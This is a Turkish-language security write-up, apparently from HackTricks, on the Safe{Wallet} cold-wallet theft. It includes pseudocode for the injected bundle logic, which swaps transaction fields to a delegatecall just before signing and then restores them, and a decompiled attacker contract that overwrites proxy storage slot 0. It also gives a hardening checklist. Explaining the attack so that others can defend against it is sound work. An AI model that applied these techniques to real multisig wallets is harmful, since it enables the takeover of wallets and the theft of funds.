# Web3 İmzalama İş Akışı İhlali & Safe Delegatecall Proxy Takeover

{{#include ../../banners/hacktricks-training.md}}

## Genel Bakış

Bir cold-wallet hırsızlık zinciri, Safe{Wallet} web UI'sinin **supply-chain compromise** ile zincir üzerinde çalışan bir **delegatecall primitive**'ın bir proxy’nin implementation pointer’ını (slot 0) üzerine yazmasıyla birleşti. Temel çıkarımlar:

- Eğer bir dApp imzalama yoluna kod enjekte edebilirse, bir signer'ın diğer imzalayanların haberi olmadan orijinal UI verilerini geri yüklerken geçerli bir **EIP-712 signature over attacker-chosen fields** üretmesini sağlayabilir.
- Safe proxy’leri `masterCopy` (implementation) değerini **storage slot 0**'da saklar. Slot 0'a yazan bir contract'a yapılan bir delegatecall, Safe'i etkili biçimde saldırgan mantığına yükselterek cüzdan üzerinde tam kontrol sağlar.

## Off-chain: Targeted signing mutation in Safe{Wallet}

Bir değiştirilmiş Safe bundle'ı (`_app-*.js`) belirli Safe + signer adreslerini seçici olarak hedef aldı. Enjekte edilen mantık imzalama çağrısından hemen önce çalıştırıldı:
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Saldırı özellikleri
- **Context-gated**: mağdur Safe'lar/imzalayanlar için sabit kodlanmış allowlist'ler gürültüyü engelledi ve tespiti azalttı.
- **Last-moment mutation**: alanlar (`to`, `data`, `operation`, gas) `signTransaction`'dan hemen önce üzerine yazıldı, sonra geri alındı; bu yüzden UI'daki teklif yükleri zararsız görünürken imzalar saldırgan yükle eşleşiyordu.
- **EIP-712 opacity**: cüzdanlar yapılandırılmış veriyi gösteriyordu ama iç içe calldata'yı çözmüyor veya `operation = delegatecall`'ı vurgulamıyordu; bu yüzden değiştirilen mesaj etkili şekilde blind-signed oldu.

### Gateway doğrulama önemi
Safe teklifleri **Safe Client Gateway**'e gönderilir. Sertleştirilmiş kontroller uygulanmadan önce, gateway, UI'nin imzalamadan sonra alanları yeniden yazması durumunda `safeTxHash`/imza JSON gövdesindeki alanlarla farklılık gösterse bile bir teklifi kabul edebiliyordu. Olaydan sonra gateway artık hash/imza gönderilen işlemle eşleşmeyen teklifleri reddediyor. Benzer sunucu tarafı hash doğrulaması her türlü signing-orchestration API'sinde uygulanmalı.

## On-chain: Slot collision ile delegatecall proxy ele geçirme

Safe proxy'ları `masterCopy`'ı **storage slot 0**'da tutar ve tüm mantığı ona devreder. Safe **`operation = 1` (delegatecall)** desteklediği için, imzalanmış herhangi bir işlem rasgele bir sözleşmeye işaret edebilir ve sözleşmenin kodunu proxy'nin depolama bağlamında çalıştırabilir.

Bir saldırgan kontratı ERC-20 `transfer(address,uint256)`'i taklit etti ama bunun yerine `_to`'yu slot 0'a yazdı:
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
İşlem akışı:
1. Kurbanlar `execTransaction`'ı `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)` ile imzalar.
2. Safe masterCopy bu parametreler üzerinde imzaları doğrular.
3. Proxy `attackerContract`'a delegatecall yapar; `transfer` gövdesi slot 0'ı yazar.
4. Slot 0 (`masterCopy`) artık saldırgan kontrollü mantığa işaret eder → **cüzdanın tamamen ele geçirilmesi ve fonların boşaltılması**.

## Tespit ve sertleştirme kontrol listesi

- **UI bütünlüğü**: JS varlıklarını pinleyin / SRI; bundle farklılıklarını izleyin; imzalama UI'sını güven sınırının bir parçası olarak değerlendirin.
- **İmzalama zamanında doğrulama**: donanım cüzdanları ile **EIP-712 clear-signing**; `operation`'ı açıkça gösterin ve iç içe calldata'ları decode edin. Politika izin vermiyorsa `operation = 1` olduğunda imzalamayı reddedin.
- **Sunucu tarafı hash kontrolleri**: teklifleri ileten gateways/servisler `safeTxHash`'i yeniden hesaplamalı ve imzaların gönderilen alanlarla eşleştiğini doğrulamalı.
- **Politika/izin listeleri**: `to`, selector'lar, varlık tipleri için ön kontrol kuralları uygulayın ve onaylı akışlar dışında delegatecall'ı yasaklayın. Tam imzalı işlemler yayınlanmadan önce dahili bir politika servisi gerektirin.
- **Sözleşme tasarımı**: multisig/treasury cüzdanlarda rastgele delegatecall açığa çıkarmaktan kaçının, zorunlu olmadıkça. Yükseltme işaretçilerini slot 0'dan uzak tutun veya açık yükseltme mantığı ve erişim kontrolü ile koruyun.
- **İzleme**: hazine fonu tutan cüzdanlardan gelen delegatecall yürütmeleri ve `operation`'ı tipik `call` kalıplarından değiştiren teklifler için uyarı verin.

## References

- [In-depth technical analysis of the Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
